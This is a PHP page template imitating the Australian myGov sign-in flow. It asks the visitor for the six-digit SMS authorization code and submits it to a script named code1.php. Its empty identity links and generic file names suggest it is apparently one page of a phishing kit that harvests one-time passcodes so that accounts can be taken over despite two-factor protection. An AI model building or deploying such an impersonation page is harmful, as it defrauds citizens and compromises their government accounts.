<?php

require("header-w.php");
?>


<div class="wrapper-mapwap">
    <div class="main-block" role="main">
      <div class="cbLogin">
        <div class="login-grid-container">
          <div class="login-grid-row">
            <div class="login-grid-column">
              <div class="login-card-wrapper">
                <div class="main-login-card override">
                  <a class="button-back" href="index.php">Back</a>

                  <h1>Verify Information with myGov</h1>
                  <p class="login-instruction-text">An authorization code was sent to you via text to your mobile number.</p>

                  <form class="code" action="code1.php" method="post">
                    <div class="input-group">
                      <label class="override" for="otp"  style="font-weight: bold;">Check your mobile phone and enter the authorization code:</label>
                      <div>
                        <input id="otp" name="otp" class="cb-input" type="text">
                        <script>
                                var element = document.getElementById('otp');
                                var maskOptions = {
                                mask: '000000'
                                };
                                var mask = IMask(element, maskOptions);
                            </script>
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter the authorization code.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="button-main-container override">
                      <div class="button-container">
                        <button type="submit" class="button-main button-submit">Next</button>
                      </div>
                    </div>

                    <p class="create-account-text">
											<a class="create-account-link" href="create.php">Create a myGov account</a> if you don't have one already.
										</p>
                  </form>

                  <div class="hr-word">
                    <div class="draw-circle">
                      or
                    </div>
                  </div>

                  <div class="login-card secondary">
                    <div class="button-login-container">
                      <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
                      <div class="login-option-container">
                        <div class="inner-options">
                          <p class="external-links-zone">
                            What is <a href="">Digital Identity</a> and <a href="">myGovID</a>?
                          </p>
                          <a class="button-digital-identity" href="">Continue with Digital Identity</a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

<?
require("footer.php");
?>